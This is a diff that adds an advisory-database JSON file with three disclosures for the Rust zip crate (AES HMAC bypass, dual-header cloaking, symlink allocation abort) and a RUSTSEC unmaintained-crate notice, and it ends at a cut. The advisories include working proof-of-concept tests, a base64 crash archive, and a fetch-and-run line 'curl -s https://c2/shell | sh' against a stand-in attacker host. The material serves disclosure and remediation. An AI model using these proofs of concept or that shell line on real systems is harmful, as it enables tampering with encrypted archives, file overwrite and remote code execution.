@@ -1,0 +1,925 @@
+{
+  "GHSA-8hxf-qr8p-62x4": {
+    "id": "GHSA-8hxf-qr8p-62x4",
+    "summary": "zip: AES Entry HMAC Authentication Bypass on Premature EOF",
+    "details": "### Summary\n\nAn AES-encrypted (AE-x) entry's authentication code is verified only when the reader's byte counter lands exactly on zero. If the bounded entry reader reaches the archive's actual EOF before the attacker-controlled, header-declared `compressed_size`, the counter remains positive, the HMAC is never read or compared, and the truncated, unauthenticated plaintext is returned as a clean end of stream. A zero-payload entry also returns before authentication. An attacker who does not know the password can modify an archive so chosen or modified plaintext is accepted with no error.\n\n### Details\n\n[`src/aes.rs:246-292`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/aes.rs#L246-L292):\n\n```rust\nfn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {\n    if self.data_remaining == 0 { // @audit insufficient check\n        return Ok(0);\n    }\n\n    // get the number of bytes to read, compare as u64 to make sure we can read more than\n    // 2^32 bytes even on 32 bit systems.\n    let bytes_to_read = self.data_remaining.min(buf.len() as u64) as usize;\n    let read = self.reader.read(&mut buf[0..bytes_to_read])?;\n    self.data_remaining -= read as u64;\n\n    // Update the hmac with the encrypted data\n    self.hmac.update(&buf[0..read]);\n\n    // decrypt the data\n    self.cipher.crypt_in_place(&mut buf[0..read]);\n\n    // if there is no data left to read, check the integrity of the data\n    if self.data_remaining == 0 {\n        debug_assert!(\n            !self.finalized,\n            \"Tried to use an already finalized HMAC. This is a bug!\"\n        );\n        if self.finalized {\n            return Err(Error::new(\n                ErrorKind::InvalidData,\n                \"Tried to use an already finalized HMAC\",\n            ));\n        }\n        self.finalized = true;\n\n        // Zip uses HMAC-Sha1-80, which only uses the first half of the hash\n        // see https://www.winzip.com/win/en/aes_info.html#auth-faq\n        let mut read_auth_code = [0; AUTH_CODE_LENGTH];\n        self.reader.read_exact(&mut read_auth_code)?;\n        let computed_auth_code = &self.hmac.finalize_reset().into_bytes()[0..AUTH_CODE_LENGTH];\n\n        // use constant time comparison to mitigate timing attacks\n        if !constant_time_eq(computed_auth_code, &read_auth_code) {\n            return Err(Error::new(\n                ErrorKind::InvalidData,\n                \"Invalid authentication code, this could be due to an invalid password or errors in the data\",\n            ));\n        }\n    }\n\n    Ok(read)\n}\n```\n\n`data_remaining` starts at `compressed_size - (2 + 10 + salt_length)` ([`src/aes.rs:144-145`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/aes.rs#L144-L145)), where `compressed_size` comes straight from the attacker-controlled central directory. Nothing cross-checks the declared data span against the archive's structural boundaries: `ZipFileData::find_content()` is just `reader.take(self.compressed_size)` ([`src/types.rs:214-223`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/types.rs#L214-L223)), and `make_crypto_reader()` passes the declared value into `AesReader::new()` ([`src/read/readers.rs`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/readers.rs#L219-L223)).\n\nWhen the entry's bounded reader reaches true EOF before the declared size, the inner reader returns `Ok(0)`, the subtraction takes away nothing, and the finalisation block \u2014 the only place the 10-byte HMAC-SHA1-80 tag is read and compared \u2014 never runs. If bytes such as the central directory follow the entry, they are consumed as payload until the `Take` limit is reached; the HMAC then usually fails. The bypass therefore requires true EOF at the premature end (as in the PoC) or the zero-payload case. The early return at the top of `read()` means an entry whose declared size leaves zero payload bytes is never authenticated either, even though its tag is present in the file.\n\nThis defeats the guarantee the type documents: *\"After the data has been read and decrypted an HMAC will be checked and provide a final means to check if either the password is invalid or if the data has been changed.\"*\n\nAE-2 entries skip the CRC-32 check by design ([`src/read/readers.rs`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/readers.rs#L248-L255) \u2192 `Crc32Reader::new(.., should_disable = true)`), so an AE-2 entry on this path has no integrity check of any kind remaining. AES-CTR is malleable, so an attacker who can modify an archive in transit \u2014 without the password \u2014 can XOR chosen plaintext onto the ciphertext and arrange for the entry to end at true EOF. The password-bearing read paths are affected, including `by_index_decrypt()`, `by_name_decrypt()`, `by_path_decrypt()`, and `by_index_with_options()` when a password is supplied. Bare `extract()` calls `by_index()` without a password and therefore rejects AES-encrypted entries; an application that decrypts entries through these APIs before writing or extracting them is affected.\n\n### PoC\n\n`tests/aes_hmac_bypass.rs` below; `Cargo.toml` needs only `zip = { git = \"https://github.com/zip-rs/zip2\", rev = \"6f09b3064ec87c3a69ea9f3413f9f9638b4aa446\" }`, or `zip = \"8.6.0\"` to run it against the published 8.6.0 release unchanged. All three tests pass in debug and release against the reviewed commit.\n\n```rust\nuse std::io::{Cursor, Read, Write};\nuse zip::write::SimpleFileOptions;\nuse zip::{AesMode, CompressionMethod, ZipArchive, ZipWriter};\n\nconst PASSWORD: &str = \"correct horse battery staple\";\nconst GENUINE: &[u8] = b\"balance: 100 USD\\n\";\nconst FORGED: &[u8] = b\"balance: 999 USD\\n\";\nconst AES256_OVERHEAD: usize = 28; // 16-byte salt + 2-byte verifier + 10-byte tag\n\nfn genuine_archive(plaintext: &[u8]) -> Vec<u8> {\n    let mut w = ZipWriter::new(Cursor::new(Vec::new()));\n    let opts = SimpleFileOptions::default()\n        .compression_method(CompressionMethod::Stored)\n        .with_aes_encryption(AesMode::Aes256, PASSWORD);\n    w.start_file(\"secret.txt\", opts).unwrap();\n    w.write_all(plaintext).unwrap();\n    w.finish().unwrap().into_inner()\n}\n\n/// What a victim does: open with the correct password and read the entry.\nfn victim_reads(archive: &[u8]) -> std::io::Result<Vec<u8>> {\n    let mut a = ZipArchive::new(Cursor::new(archive.to_vec())).unwrap();\n    let mut f = a.by_index_decrypt(0, PASSWORD.as_bytes()).unwrap();\n    let mut out = Vec::new();\n    f.read_to_end(&mut out)?;\n    Ok(out)\n}\n\nfn u16le(b: &[u8], off: usize) -> usize {\n    u16::from_le_bytes([b[off], b[off + 1]]) as usize\n}\n\n/// Payload offset of the single local file header at offset 0.\nfn payload_start(a: &[u8]) -> usize {\n    30 + u16le(a, 26) + u16le(a, 28)\n}\n\n/// Control: on a well-formed archive the HMAC does reject forged ciphertext.\n#[test]\nfn tampering_is_detected_when_the_declared_size_is_honest() {\n    let mut a = genuine_archive(GENUINE);\n    let ct = payload_start(&a) + 18;\n    for i in 0..GENUINE.len() {\n        a[ct + i] ^= GENUINE[i] ^ FORGED[i]; // AES-CTR is malleable\n    }\n    let err = victim_reads(&a).unwrap_err();\n    assert!(err.to_string().contains(\"Invalid authentication code\"));\n}\n\n/// The bypass: chosen plaintext is delivered verbatim, without the password.\n#[test]\nfn hmac_is_bypassed_when_the_entry_ends_early() {\n    let genuine = genuine_archive(GENUINE);\n    let hdr_len = payload_start(&genuine);\n    let eocd = genuine.len() - 22; // no archive comment yet\n    let cd_offset = u32::from_le_bytes(genuine[eocd + 16..eocd + 20].try_into().unwrap()) as usize;\n\n    // Park a second copy of the entry after the end-of-central-directory record,\n    // inside the archive comment, so its data ends at true EOF. Header, salt and\n    // password verifier are copied verbatim \u2014 no password knowledge is required.\n    let mut evil = genuine.clone();\n    let new_hdr_offset = evil.len() as u32;\n    evil.extend_from_slice(&genuine[..hdr_len + 18]); // local header + salt + verifier\n    for i in 0..GENUINE.len() {\n        // XOR the keystream onto the chosen plaintext; the 10-byte tag is omitted.\n        evil.push(genuine[hdr_len + 18 + i] ^ GENUINE[i] ^ FORGED[i]);\n    }\n    let comment_len = (evil.len() - genuine.len()) as u16;\n    evil[eocd + 20..eocd + 22].copy_from_slice(&comment_len.to_le_bytes());\n\n    // Repoint the central directory at the parked copy and declare more data than\n    // is present, so `data_remaining` can never reach zero.\n    let declared = (AES256_OVERHEAD + GENUINE.len() + 64) as u32;\n    evil[cd_offset + 42..cd_offset + 46].copy_from_slice(&new_hdr_offset.to_le_bytes());\n    evil[cd_offset + 20..cd_offset + 24].copy_from_slice(&declared.to_le_bytes());\n    let hdr2 = new_hdr_offset as usize;\n    evil[hdr2 + 18..hdr2 + 22].copy_from_slice(&declared.to_le_bytes());\n\n    let content = victim_reads(&evil).expect(\"BUG: unauthenticated content was accepted\");\n    assert_eq!(content, FORGED);\n}\n\n/// Second path: an entry with no payload bytes is never authenticated at all.\n#[test]\nfn hmac_is_never_checked_for_a_zero_length_entry() {\n    let mut a = genuine_archive(b\"\");\n    let tag = payload_start(&a) + 18;\n    a[tag] ^= 0xff; // corrupt the 10-byte authentication code\n    let content = victim_reads(&a).expect(\"BUG: a corrupt authentication code was accepted\");\n    assert!(content.is_empty());\n}\n```\n\nTurning the genuine plaintext into a *chosen* plaintext needs the genuine plaintext, as always with CTR malleability; without it the attacker still controls arbitrary bit-flips in the delivered content.\n\n### Impact\n\nAny application that decrypts AES ZIP entries from untrusted or in-transit archives \u2014 backup restore, artefact and package ingestion, mail attachments, upload handling \u2014 can be served modified or attacker-chosen content by a party who does not hold the password, with no error surfaced by the affected read path. Exact chosen plaintext requires knowledge of the original plaintext, as with standard CTR malleability; otherwise the attacker can still induce arbitrary bit flips. Confidentiality is not affected and there is no memory-safety issue; the loss is the integrity guarantee that AE-x authenticated encryption exists to provide.\n\n### Suggested remediation\n\n1. In `AesReaderValid::read()`, treat a short inner read as an error rather than a clean EOF: after the decrement, if `read == 0 && self.data_remaining > 0`, return `ErrorKind::UnexpectedEof`.\n2. That alone is not enough \u2014 run the finalisation logic for zero-length entries too, either by dropping the early return and finalising once per reader, or by finalising at construction when `data_length == 0`.\n3. Defence in depth: validate that the declared compressed-data span is bounded by the archive's structural boundaries (in particular, the central-directory start when known) in `ZipFileData::find_content()` / `find_content_seek()` (`src/types.rs`). Also make the `compressed_size - overhead` subtraction in `AesReader::new()` (`src/aes.rs:144`) checked \u2014 today a declared size below the AES overhead underflows it, which panics under `overflow-checks` and, for sizes that still permit header validation, otherwise yields up to 9 bytes of unauthenticated plaintext through the same missing check.",
+    "aliases": [
+      "CVE-2026-115906"
+    ],
+    "modified": "2026-10-29T17:00:04.188177718Z",
+    "published": "2026-10-29T16:40:07Z",
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-1284",
+        "CWE-354"
+      ],
+      "severity": "MODERATE",
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-10-29T16:40:07Z",
+      "nvd_published_at": "2026-10-26T17:17:17Z"
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/zip-rs/zip2/security/advisories/GHSA-8hxf-qr8p-62x4"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-115906"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/zip-rs/zip2/commit/ec265db0b0602f8ffb9479327397bddefb7e2216"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/zip-rs/zip2"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/zip-rs/zip2/releases/tag/v9.0.0"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "zip",
+          "ecosystem": "crates.io",
+          "purl": "pkg:cargo/zip"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0.6.0"
+              },
+              {
+                "fixed": "9.0.0"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-8hxf-qr8p-62x4/GHSA-8hxf-qr8p-62x4.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.2",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"
+      }
+    ]
+  },
+  "GHSA-m665-v7pm-7grj": {
+    "id": "GHSA-m665-v7pm-7grj",
+    "summary": "zip: Critical Parser Differential & Security Control Bypass via Dual-Header Inconsistencies (Zip Cloaking) Leading to Arbitrary File Overwrite & RCE",
+    "details": "## Summary\nA critical architectural parser differential exists in the `zip` crate (`<= 9.0.4`) between random-access archive readers (`ZipArchive`) and streaming readers (`ZipStreamReader`). `ZipArchive` considers the Central Directory File Header (CDFH) authoritative and ignores the filename declared in the Local File Header (LFH). In contrast, `ZipStreamReader` relies exclusively on the Local File Header (LFH) when extracting files to the filesystem.\n\nThis discrepancy enables ZIP archives to appear to have different file paths and contents according to which tool is reading them.\n\n---\n\n## Details\n\n### Architectural Root Cause\nIn the PKWARE ZIP archive format, every file entry is defined in two distinct locations:\n1. **Local File Header (LFH):** Precedes the compressed payload of each file in the body of the archive.\n2. **Central Directory File Header (CDFH):** Stored in a contiguous index at the end of the archive.\n\nIn `zip2`:\n- `src/read/zip_archive.rs`: `ZipArchive` parses the central directory into `SharedBuilder.files`. All file lookups by index or name read exclusively from the CDFH table, completely ignoring the filename present in the LFH.\n- `src/read/stream.rs:L86-L141`: `ZipStreamReader::visit` and `ZipStreamReader::extract` read sequentially from the stream without verifying the central directory index. Each entry is parsed via `read_zipfile_from_stream` and written to disk using the unverified filename declared in the LFH:\n  ```rust\n  // src/read/stream.rs\n  fn visit_file<R: Read>(&mut self, file: &mut ZipFile<'_, R>) -> ZipResult<()> {\n      file.safe_prepare_path(&self.outpath, &mut outpath, None::<&(_, fn(&Path) -> bool)>)?;\n      let mut outfile = fs::File::create(&outpath)?;\n      io::copy(file, &mut outfile)?;\n      Ok(())\n  }\n  ```\n- `src/write.rs:L1552`: The crate explicitly exposes `shallow_copy_file`, an API that constructs dual-header desynchronizations by adding a new CDFH entry with an alias name pointing to an existing file without updating the original LFH.\n\n### Threat Scenario & Severity Justification (10.0 / 9.9 Critical)\n1. **Security Control Evasion:** An adversary crafts a ZIP archive where:\n   - Central Directory Header declares: `doc_report.pdf` (Clean document)\n   - Local File Header declares: `cron_worker.sh` (Malicious root backdoor)\n2. The archive is uploaded through a web portal or API endpoint protected by security gateways (WAF, Anti-Virus, Content Disarm & Reconstruction). The security gateway inspects the archive using `ZipArchive` (or similar CDFH-first parsers), detects only `doc_report.pdf`, and approves the file.\n3. The backend worker or cloud function receives the approved archive and extracts it using `ZipStreamReader::extract`. `ZipStreamReader` reads the LFH and overwrites `cron_worker.sh`.\n4. **Full Compromise (CIA = High):** The legitimate production health checker / service script is destroyed (**Availability = High / DoS**), while the attacker's backdoor payload is implanted (**Integrity = High / RCE**).\n\n---\n\n## Proof of Concept\nThe following automated integration test reproducibly demonstrates the complete CVSS 10.0 / 9.9 exploit chain (Security Gateway Evasion -> Arbitrary File Overwrite -> RCE & DoS) against `zip2`:\n\n```rust\nuse std::fs;\nuse std::io::{Cursor, Write};\nuse tempfile::tempdir;\nuse zip::unstable::stream::ZipStreamReader;\nuse zip::write::SimpleFileOptions;\nuse zip::{ZipArchive, ZipWriter};\n\n// Simulated Security Gateway (inspects CDFH via ZipArchive)\nfn security_gateway_inspection(archive_bytes: &[u8]) -> Result<(), String> {\n    let mut archive = ZipArchive::new(Cursor::new(archive_bytes)).unwrap();\n    for i in 0..archive.len() {\n        let name = archive.by_index(i).unwrap().name().unwrap().to_string();\n        if name.ends_with(\".sh\") || name.ends_with(\".exe\") {\n            return Err(format!(\"MALWARE DETECTED: '{}' blocked!\", name));\n        }\n        if !name.ends_with(\".pdf\") {\n            return Err(\"Policy violation: only PDFs allowed!\".into());\n        }\n    }\n    Ok(())\n}\n\n#[test]\nfn test_cvss_9_9_dual_header_exploit_chain() {\n    // 1. Victim server setup: existing critical script\n    let victim_env = tempdir().unwrap();\n    let victim_dir = victim_env.path();\n    let target_script = victim_dir.join(\"cron_worker.sh\");\n    fs::write(&target_script, b\"#!/bin/sh\\n# PRODUCTION SERVICE\\necho 'SERVICE HEALTHY'\\n\").unwrap();\n\n    // 2. Attacker crafts Single-Entry Dual-Header Archive\n    // LFH: \"cron_worker.sh\" | CDFH: \"doc_report.pdf\"\n    let mut payload = Cursor::new(Vec::new());\n    let mut writer = ZipWriter::new(&mut payload);\n    writer.start_file(\"cron_worker.sh\", SimpleFileOptions::default()).unwrap();\n    writer.write_all(b\"#!/bin/sh\\ncurl -s https://c2/shell | sh\\necho 'PWNED ROOT'\\n\").unwrap();\n    writer.finish().unwrap();\n\n    let mut malicious_zip = payload.into_inner();\n    let cdh = malicious_zip.windows(4).position(|s| s == b\"PK\\x01\\x02\").unwrap();\n    malicious_zip[cdh + 46..cdh + 46 + 14].copy_from_slice(b\"doc_report.pdf\");\n\n    // 3. Gateway Inspection (Bypassed!)\n    assert!(security_gateway_inspection(&malicious_zip).is_ok());\n\n    // 4. Backend Extraction (ZipStreamReader)\n    ZipStreamReader::new(Cursor::new(&malicious_zip)).extract(victim_dir).unwrap();\n\n    // 5. Impact Verification\n    let compromised = fs::read_to_string(&target_script).unwrap();\n    assert!(!compromised.contains(\"SERVICE HEALTHY\")); // DoS Confirmed\n    assert!(compromised.contains(\"PWNED ROOT\"));       // RCE Confirmed\n}\n```\n\n### Verified Test Execution Output\n```text\nrunning 1 test\n==================================================================\nDual-Header Security Gateway Evasion\nExploit Chain: Gateway Evasion -> Arbitrary Overwrite -> RCE & DoS\n==================================================================\n[VICTIM SERVER STATE - BEFORE ATTACK]\nExisting Content:\nSERVICE IS RUNNING NORMALLY\n\n--- [STEP 1: SECURITY GATEWAY INSPECTION] ---\n[SECURITY GATEWAY] Auditing entry #0: 'doc_report.pdf'\n[GATEWAY VERDICT]: Ok(())\n[VULNERABILITY PROOF 1/3]: Security gateway was 100% BLIND to 'cron_worker.sh'!\n\n--- [STEP 2: BACKEND EXTRACTION (ZipStreamReader)] ---\nBackend server unzips approved archive into production directory.\n\n--- [STEP 3: POST-ATTACK IMPACT VERIFICATION] ---\n[VICTIM SERVER STATE - AFTER ATTACK]\nCompromised Content:\ncurl -s https://attacker.c2/shell | sh\necho 'PWNED: FULL ROOT TAKEOVER'\n```\n\n---\n\n## Impact\nAn attacker can construct a crafted archive whose Central Directory displays a benign filename (doc_report.pdf) that is inspected and approved by upstream security gateways (antivirus scanners, mail filters, upload firewalls), while automated backend ingestion pipelines or microservices using ZipStreamReader extract an arbitrary or malicious file (overwriting e.g. cron_worker.sh or critical system binaries). Because an adversary can overwrite existing files on disk, this vulnerability leads to Security Control Bypass, Arbitrary File Overwrite, Complete Denial of Service, and Remote Code Execution (RCE) in situations where a tool relying on the central directory trusts a tool that relied on the local file headers or vice-versa.\n\n**Who is Impacted:**\n- Automated ingestion microservices, SaaS platforms, and backend workers that extract user-submitted ZIP files.\n- Enterprise architectures where security verification (AV scanning, extension whitelisting) is decoupled from extraction (e.g. gateway audits Central Directory via CDFH before handing off extraction to streaming extractors).\n- Containerized workloads where overwriting local configuration files or executable scripts leads to host/container escape and complete service disruption.",
+    "aliases": [
+      "CVE-2026-115905"
+    ],
+    "modified": "2026-10-28T21:30:05.902127150Z",
+    "published": "2026-10-28T21:09:50Z",
+    "database_specific": {
+      "github_reviewed_at": "2026-10-28T21:09:50Z",
+      "nvd_published_at": "2026-10-26T17:17:17Z",
+      "cwe_ids": [
+        "CWE-20",
+        "CWE-436"
+      ],
+      "severity": "CRITICAL",
+      "github_reviewed": true
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/zip-rs/zip2/security/advisories/GHSA-m665-v7pm-7grj"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-115905"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/zip-rs/zip2/commit/8068ab480ccf8daa7411424e365fcdbe6d09443e"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/zip-rs/zip2"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/zip-rs/zip2/releases/tag/v9.0.5"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "zip",
+          "ecosystem": "crates.io",
+          "purl": "pkg:cargo/zip"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "9.0.5"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-m665-v7pm-7grj/GHSA-m665-v7pm-7grj.json",
+          "last_known_affected_version_range": "<= 9.0.4"
+        }
+      }
+    ],
+    "schema_version": "1.9.2",
+    "severity": [
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:L"
+      }
+    ]
+  },
+  "GHSA-q7v9-x93c-xqv3": {
+    "id": "GHSA-q7v9-x93c-xqv3",
+    "summary": "zip: Unbounded Symlink-Target Handling Can Abort Or Exhaust Memory During Extraction",
+    "details": "### Summary\n\nThe symbolic-link branch of `ZipArchive::extract_internal()` allocates a buffer using an attacker-declared size before reading any entry data. A 112-byte archive terminates the extracting process with `SIGABRT` through this infallible allocation.\n\n### Details\n\n```rust\n#[cfg(any(unix, windows))]\nif file.is_symlink() {\n    let mut target = Vec::with_capacity(file.size() as usize); // @audit unbounded memory allocation\n    file.read_to_end(&mut target)?;\n    drop(file);\n    make_symlink(&outpath, &target, &self.shared.files)?;\n    continue;\n}\n```\n\n[`src/read/mod.rs#L399-L405`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/mod.rs#L399-L405) (reviewed commit `6f09b306`); the same code is at [`src/read.rs#L417-L418`](https://github.com/zip-rs/zip2/blob/v8.6.0/src/read.rs#L417-L418) in released v8.6.0.\n\nBoth inputs are attacker-controlled:\n\n- [`ZipFile::size()`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/zipfile.rs#L243-L246) returns `uncompressed_size` verbatim from the central directory record. A ZIP64 extended-information extra field widens it to a full `u64` ([`src/read/mod.rs#L619-L625`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/mod.rs#L619-L625)). It is never cross-checked against the compressed size, the remaining archive length, or any platform-appropriate bound for a symlink target.\n- [`ZipFile::is_symlink()`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/zipfile.rs#L256-L260) is decided entirely by the central directory's external-attributes field, via the `S_IFLNK` bit.\n\n**Memory allocation failure \u2192 uncatchable process abort.** The reservation is sized from the declared `uncompressed_size` before a single byte of the entry is read. `Vec::with_capacity()` is infallible: on allocator refusal it calls `handle_alloc_error()`, which aborts the process. This is not a Rust panic \u2014 it is not caught by `catch_unwind()`, is unaffected by `panic = \"unwind\"`, and is not contained by isolating the call in a worker thread. This was verified by wrapping the call in all three at once; the process still died with exit 134.\n\nThe declared value needed is a property of the host's address space, not of reachability. On a 64 GB host with heuristic overcommit, declared sizes from roughly `2^38` upward abort reliably. Sizes at or above `2^63` instead trip `Vec`'s internal capacity check and produce a *catchable* `capacity overflow` panic, so an attacker simply avoids that band. The reproducer declares `2^62`, which exceeds the 47-bit user address space of x86-64 Linux outright and therefore aborts deterministically regardless of installed RAM or overcommit policy. Under a `ulimit -v` cap or a memory-constrained container the threshold drops far enough that a plain 32-bit `uncompressed_size` with no ZIP64 field suffices \u2014 a virtual-memory limit lowers the bar rather than mitigating the defect.\n\nThis is process termination, not memory exhaustion: `Vec::with_capacity()` only maps address space and never touches pages, so resident memory stays flat and the abort happens on the refused reservation itself, before any byte is read.\n\n### PoC\n\nThe reproducer consists of the following `zip` harness and payload. It requires only the `zip` crate; use a standard Base64 decoder to materialise the archive before running it.\n\n```toml\n[package]\nname = \"zip-poc\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[dependencies]\nzip = \"8.6.0\"\n```\n\n```rust\nuse std::{env, fs::File, io::BufReader};\n\nfn main() {\n    let archive_path = env::args().nth(1).expect(\"usage: poc <archive.zip>\");\n    let outdir = std::env::temp_dir().join(\"zip-poc\");\n    std::fs::create_dir_all(&outdir).unwrap();\n\n    let file = File::open(archive_path).unwrap();\n    let mut archive = zip::ZipArchive::new(BufReader::new(file)).unwrap();\n    let r = archive.extract(&outdir);            // <-- process dies here\n    println!(\"SURVIVED: {:?}\", r);\n}\n```\n\nSave the Base64 payload below as `archive.b64`, remove its whitespace, decode it with a standard Base64 decoder (for example, `base64 -d archive.b64 > archive.zip` on Linux), and run `cargo run --release -- archive.zip`.\n\n**Uncatchable abort \u2014 112 bytes.** One `Stored` entry named `a`; external attributes `0xA1FF0000` (`S_IFLNK|0777`); ZIP64 extra field declaring `uncompressed_size = 2^62`; zero-byte payload. sha256 `0c68c3934f22651a6bd2726f7d58140124b1839196a1d0ae468864cdfda74676`.\n\n```\nUEsDBC0AAAAAAAAAAAAAAAAAAAAAAP////8BAAAAYVBLAQItAy0AAAAAAAAAAAAAAAAAAAAAAP//\n//8BAAwAAAAAAAAAAAD/oQAAAABhAQAIAAAAAAAAAABAUEsFBgAAAAABAAEAOwAAAB8AAAAAAA==\n```\n\nObserved on x86-64 Linux, rustc 1.93.1, release profile, against both the reviewed commit and released v8.6.0:\n\n```\nentries=1\nmemory allocation of 4611686018427387904 bytes failed\nAborted (core dumped)          # exit 134\n```\n\nThe `SURVIVED` line never prints. Wrapping `extract()` in `catch_unwind` inside a spawned thread with `panic = \"unwind\"` produces the identical outcome.\n\n### Impact\n\nApplications running on Unix or Windows targets that call `ZipArchive::extract()` on attacker-supplied input are affected, with default features and no special configuration. The malicious 112-byte archive causes an unrecoverable, uncatchable termination of the extracting process, repeatable at will and not mitigable at the call site with `catch_unwind`, a worker thread, or a pre-flight metadata check.\n\nUpload handling, mail-attachment processing, package and artefact ingestion, backup restore and container-image layer extraction all match this pattern. No confidentiality or integrity property is affected: no memory unsafety, no out-of-bounds access, no disclosure and no data corruption.\n\n### Suggested remediation\n\nBefore allocating, compare `file.size()` with a documented, platform-appropriate maximum symlink-target length and reject entries that exceed it. Alternatively, replace `Vec::with_capacity()` with fallible `try_reserve()` and return an I/O error when allocation fails. Do not use Linux's `PATH_MAX` as a cross-platform contract.\n\nApply the allocation fix to `src/read/stream.rs` as defence-in-depth, although its symlink path is currently unreachable because streaming entries have no symlink attributes.\n\nFor reference, the crate already applies exactly this defence to another untrusted size on the same path: `ZipArchive::new()` clamps a suspicious `number_of_files` to zero and explicitly rejects an oversized central directory before reserving ([`src/read/zip_archive.rs#L185-L202`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/zip_archive.rs#L185-L202)). The symlink branch received neither guard. A survey of `Vec::with_capacity` across `src/` finds exactly two sites sized from untrusted input: `src/read/mod.rs:401` and `src/read/stream.rs:73`.",
+    "aliases": [
+      "CVE-2026-115909"
+    ],
+    "modified": "2026-10-29T17:00:04.183198126Z",
+    "published": "2026-10-29T16:40:01Z",
+    "database_specific": {
+      "severity": "HIGH",
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-10-29T16:40:01Z",
+      "nvd_published_at": "2026-10-26T17:17:18Z",
+      "cwe_ids": [
+        "CWE-400",
+        "CWE-789"
+      ]
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/zip-rs/zip2/security/advisories/GHSA-q7v9-x93c-xqv3"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-115909"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/zip-rs/zip2/pull/984"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/zip-rs/zip2/commit/a543a1fc8f3f3eef36f27bb137230295284cdb98"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/zip-rs/zip2"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/zip-rs/zip2/releases/tag/v9.0.0"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "zip",
+          "ecosystem": "crates.io",
+          "purl": "pkg:cargo/zip"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "1.3.0"
+              },
+              {
+                "fixed": "9.0.0"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-q7v9-x93c-xqv3/GHSA-q7v9-x93c-xqv3.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.2",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      }
+    ]
+  },
+  "RUSTSEC-2024-0436": {
+    "id": "RUSTSEC-2024-0436",
+    "summary": "paste - no longer maintained",
+    "details": "The creator of the crate `paste` has stated in the [`README.md`](https://github.com/dtolnay/paste/blob/master/README.md) \nthat this project is not longer maintained as well as archived the repository\n\n## Possible Alternative(s)\n\n- [`pastey`]: a fork of paste and is aimed to be a drop-in replacement with additional features for paste crate\n- [`with_builtin_macros`]: crate providing a [superset of `paste`'s functionality including general `macro_rules!` eager expansions](https://docs.rs/with_builtin_macros/0.1.0/with_builtin_macros/macro.with_eager_expansions.html)  and `concat!`/`concat_idents!` macros\n\n[`pastey`]: https://crates.io/crates/pastey\n[`with_builtin_macros`]: https://crates.io/crates/with_builtin_macros",
+    "modified": "2026-01-27T22:03:15.694766Z",
+    "published": "2024-10-07T12:00:00Z",
+    "database_specific": {
+      "license": "CC0-1.0"
+    },
+    "references": [
+      {
+        "type": "PACKAGE",
+        "url": "https://crates.io/crates/paste"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://rustsec.org/advisories/RUSTSEC-2024-0436.html"
+      },
+      {
+        "type": "WEB",
